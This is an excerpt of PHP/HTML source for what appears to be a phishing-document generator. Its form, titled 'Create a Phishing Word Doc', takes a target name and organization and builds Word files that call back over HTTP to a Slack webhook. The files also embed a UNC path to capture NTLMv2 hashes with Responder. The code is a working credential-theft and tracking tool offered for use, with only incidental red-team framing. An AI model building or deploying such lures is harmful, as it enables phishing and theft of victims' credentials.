...
if (preg_match("(" . implode("|", array_map("preg_quote", $blockorgs)) . ")", $org, $m)) {
  ...
  if (isset($_REQUEST['slackurl']) && $_REQUEST['slackurl'] != "") {
    $slackurl = $_REQUEST['slackurl'];
  } else
  // ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
  {
    $slackurl = $SlackIncomingWebhookURL;
  }
  if (isset($_REQUEST['slackchannel']) && $_REQUEST['slackchannel'] != "") {
    $slackchannel = $_REQUEST['slackchannel'];
    $slackchannel = stripslashes($slackchannel);
  }
  ...
  if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $useragent = mysqli_real_escape_string($conn2, $_SERVER['HTTP_USER_AGENT']);
  } else {
    $useragent = "";
  }
  if (isset($_REQUEST['target'])) {
    $target = mysqli_real_escape_string($conn2, $_REQUEST['target']);
  }
  if (isset($_REQUEST['org'])) {
    $org = mysqli_real_escape_string($conn2, $_REQUEST['org']);
  }
      ...
      <FONT COLOR="#ffffff">
        ...
        ?>
          <CENTER>
            ...
            <FONT COLOR="#FFFFFF">
              <H2>OR</H2><br>Use a Hyperlink and Host the Document Here
            </FONT><BR><BR>
            <?php
        ...
        ?>
          <FORM METHOD="POST" ACTION="<?php echo $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
            <CENTER>
              <FONT COLOR="#ffffff">
                <H1>Create a Phishing Word Doc</H1>
              </FONT><br>
              <TABLE>
                <TR>
                  ...
                  <TH>Organization</TH>
                  <TH>Payloads</TH>
                  <TH COLSPAN="2">Slack Settings<br>(Not Required)</TH>
                </TR>
                <TR>
                  <TD><SELECT NAME="HTTPValue">
                      <option value="http">http</option>
                      <option value="https" selected>https</option>
                    </SELECT></TD>
                  <TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME']; ?>"></TD>
                  <TD><input type="text" name="Target" value="Joe Smith" size="10"></TD>
                  <TD><input type="text" name="Org" value="Evil Corp" size="10"></TD>
                  <TD>
                    <font size="2">HTTP Call </font><input type="checkbox" disabled checked><br>
                    <font size="2">SMB Hash </font><input type="checkbox" disabled checked><br>
                    <font size="2">Auth Prompt <input type="checkbox" name="basicauth"></font>
                  </TD>
                  <TD align="center" style="vertical-align:bottom"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br>
                    <FONT SIZE="2">Not Required if Set in Conf</font>
                  </TD>
                  <TD align="center" style="vertical-align:bottom"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br>
                    <font size="2">Not Required if Set in Conf</font>
                  </TD>
                </TR>
                <TR>
            ...
            <FONT SIZE="3" COLOR="#ffffff">
              <p align="center">The generated Word doc will call back via HTTP to the Slack API specified in the API's php file. Also, a UNC path will be created as well in an attempt to capture NTLMv2 SMB requests. Make sure your server allows TCP 445 and you're running Responder when the documents are opened for added fun! :)</p>
            </FONT>
          </FORM>
